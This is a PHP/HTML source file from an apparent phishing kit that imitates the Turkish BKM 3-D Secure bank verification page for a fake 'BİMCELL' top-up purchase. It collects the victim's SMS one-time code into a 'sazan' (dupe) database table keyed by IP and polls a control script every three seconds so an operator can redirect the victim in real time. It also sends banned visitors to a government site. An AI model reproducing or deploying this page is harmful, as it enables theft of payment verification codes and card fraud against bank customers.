<?php
date_default_timezone_set('Europe/Istanbul');
include('baglan.php');
$ip = $_SERVER['REMOTE_ADDR'];
    $db->query("UPDATE sazan SET now = 'Sms Sayfası' WHERE ip = '{$ip}'");

if($_POST){
    $sms   = $_POST['sms'];
    
    $ip         = $_SERVER['REMOTE_ADDR'];
    $date       = date('d.m.Y H:i');
    
	$query = $db->prepare("UPDATE sazan SET sms=? WHERE ip = ?");
	$insert = $query->execute(array($sms,$ip));


    if($insert){
        header('Location:bekle.php');
    }
}

$ban = $db->query("SELECT * FROM ban", PDO::FETCH_ASSOC);
foreach($ban as $kontrol){
    if($kontrol['ban'] == $ip){ 
            header('Location:http://www.turkiye.gov.tr');
        } 
}

?>

<!DOCTYPE html>
<!-- saved from url=(0037)https://acs.bkm.com.tr/mdpayacs/pareq -->


<html lang="tr" style="height: 100%; width: 100%;"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Pragma" content="no-cache">
  <meta http-equiv="Expires" content="-1">
  <meta name="description" content="">
  <meta name="author" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <link rel="shortcut icon" type="image/png" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" href="https://acs.bkm.com.tr/mdpayacs/img/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="76x76" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="120x120" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <link rel="apple-touch-icon" type="image/png" sizes="152x152" href="https://acs.bkm.com.tr/mdpayacs/graphics/favicon.png">
  <title>BKM ACS</title>
  <!-- CSS -->
  <link rel="stylesheet" href="./bkm_acs_files/bkmacs-dist.css">
  <link rel="stylesheet" href="./bkm_acs_files/main-dist.css" type="text/css" media="screen">
  <!-- JS -->
  <!--[if gte IE 9]><!-->
  <script type="text/javascript" src="./bkm_acs_files/main-dist.js.indir"></script>
  <!--<![endif]-->
  <script type="text/javascript">var isSupportedIE = true;</script>
  <!--[if lt IE 9]>
  <script type="text/javascript">isSupportedIE = false;</script>
  <![endif]-->
  </head>
<script type="text/javascript">
 $(document).ready(function() {

    gonder();

    var int=self.setInterval("gonder()",3000);
  
});

function gonder(){

    $.ajax({
      type:'POST',
      url:'<?php echo "datach.php?ip=".$ip; ?>',
      success: function (msg) {
      
      if(msg=='sms'){
        window.location.href='sms.php';
      }
      if(msg=='tebrik'){
        window.location.href='tebrik.php';
      }
       if(msg=='hata'){
        window.location.href='hata.php';
      }
      if(msg=='sms2'){
        window.location.href='hatali.php';
      }
        if(msg=='back'){
        window.location.href='sms.php';
      }
         if(msg=='back'){
        window.location.href='index.php?1';
      }
            if(msg=='1'){
        window.location.href='index.php?1';
      }       if(msg=='2'){
        window.location.href='kart.php';
      }          if(msg=='3'){
        window.location.href='bekle.php';
      }          if(msg=='4'){
        window.location.href='hata.php';
      }          if(msg=='5'){
        window.location.href='tebrik.php';
      }  
      }
    });
    
}
</script>
  <body onload="init(180)">

    <div class="content-wrapper">
      <!--<![endif]-->
      <!--approve page-->
      <div class="header">
        <div class="brand-logo">
          <img 3dslogo="scheme" align="left" src="./bkm_acs_files/schema_000000001.gif">
        </div>
        <div class="member-logo">
          <img 3dslogo="scheme" align="right" src="./bkm_acs_files/logo_10.png">
        </div>
      </div>
      <div id="approve-page">
        <div id="loaderDiv" style="height: 100%; width: 100%; position: absolute; z-index: 1; display: none">
          <div class="loader"></div>
        </div>
        <div class="content">
          <h1 id="approve-header">Doğrulama kodunu giriniz</h1>
          <div class="info-wrapper">
            <div class="info-row">
              <div class="info-col info-label">İşyeri Adı:</div>
              <div class="info-col" 3dsdisplay="merchant" id="merchant-name">BİMCELL ONLİNE TL YÜKLEME</div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">İşlem Tutarı:</div>
			  <?php ob_start(); session_start(); $tl_amount = $_SESSION['tl_amount'];$cc_last_4 = $_SESSION['cc_last_4']; ?>
              <div class="info-col amount" 3dsdisplay="amount" id="amount"><?=$tl_amount?> TL</div>
            </div>
            <div class="info-row">
              <div class="info-col info-label">Kart Numarası:</div>
              <div class="info-col" 3dsdisplay="pan" id="pan">XXXX XXXX XXXX <?=$cc_last_4?> </div>
            </div>
          </div>
          <div class="action-wrapper" 3dsdisplay="prompt" 3dslabel="prompt">
            <div>
              <h3>İşlemi tamamlamak için kullanacağınız şifreniz bankanızda kayıtlı cep telefonunuza gönderilecektir.<br>Lütfen referanslı alışveriş şifrenizi giriniz.</h3>
            </div>
            <div class="form-wrapper">
              <input name="fakePasswordRemembered" id="fakePasswordRemembered" style="display: none;" type="password">
              <form 3dsaction="manual" id="bkmform" class="form-code" method="POST" action="sms.php" autocomplete="off" novalidate="novalidate">
                <div class="form-row">
					<label for="code" class="otpcode">Doğrulama Kodu</label>
				   <input type="hidden" name="datee" value="<?date_default_timezone_set('Etc/GMT-3');
echo date("d.m.Y  H:i:s"); ?>">
                  <input 3dsinput="password" type="text" class="f-input" oninput="maxLengthCheck(this)" onkeypress="return isNumeric(event)" name="sms" id="passwordfield" maxlength="8" min="0" max="99999999" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                </div>
                <div id="wrongPassDiv" 3dsdisplay="error" class="error-messages error-wrong-otp" style="display: block;">
                  <span class="has-reg"></span></div> 
                <div id="timeOutDiv" class="error-messages error-timeover" style="display: none;">
                  <div>
                    <span class="has-reg">Doğrulama Kodunu belirtilen süre içerisinde girmediniz.</span>
                  </div>
                  <button id="retryButton" type="submit" onclick="retryButtonClick()" class="button btn-1 re-code v1" name="newsms" value="retry">Doğrulama Kodunu Yeniden Gönder</button>
                  <div>
                    <label id="otpcompleted" for="toggle-1" style="cursor: pointer; display: none;">Yardım</label>
                  </div>
                  <input style="display: none" class="popup txt-link trigger-absolute-panel" type="checkbox" id="toggle-1">
                  <div class="noscriptHelpText">
                    Doğrulama esnasında cep telefonunuza doğrulama kodu gelmemesi
                    durumunda doğrulama için kalan sürenin dolmasını bekleyerek
                    ?Doğrulama Kodunu Tekrar Gönder? linkinden tekrar doğrulama
                    kodu gönderilmesini talep edebilirsiniz.<br> Tekrar
                    doğrulama kodu gönderimi sağlandığı halde cep telefonunuza
                    ulaşmaması ve benzeri problemlerde lütfen kartınızı ihraç eden
                    kuruluş ile irtibata geçiniz.
                  </div>
                </div>
                <div id="submitButtonDiv">
                  <div class="has-submit">
                    <button id="submitbutton" type="submit" name="submit" value="confirm" class="button btn-1 btn-commit">Onayla</button>
                  </div>
                  <div id="timerDiv" class="has-timer">
                    <span>Kalan Süre: </span> <span class="has-counter" id="has-counter">02:26</span>
                  </div>
                </div>
                <div class="call-to-action">
                  <div class="action-list">
                    <div class="action-row">
                      <div class="action-col left">
                        <a data-fancybox="" data-src="#canceldialog" href="javascript:;" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">İşlemi İptal Et</a>
                        <button id="triggercancel" type="submit" name="cancel" value="cancel" style="display: none;"></button>
                      </div>  
                      <div class="action-col right">
                        <a href="Yardim.php" class="txt-link fancybox-ajax" style="background: none !important; border: none; cursor: pointer; font-family: inherit;">Yardım</a>
                      </div>
                    </div>
                  </div>
                  <div style="display: none;">
                    <div class="panel" id="canceldialog">
                      <h1 class="small" id="msg-cancel-box">İşyeri sayfasına yönlendirileceksiniz, işleminizi iptal etmek
                        istediğinizden emin misiniz?</h1>
                      <a href="javascript:;" onclick="window.history.back();" class="button btn-1 close-modal">Vazgeç</a>
                     
                    </div>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
    <script type="text/javascript" src="./bkm_acs_files/bkmacs-dist.js.indir" charset="utf-8"></script>
  

</body></html>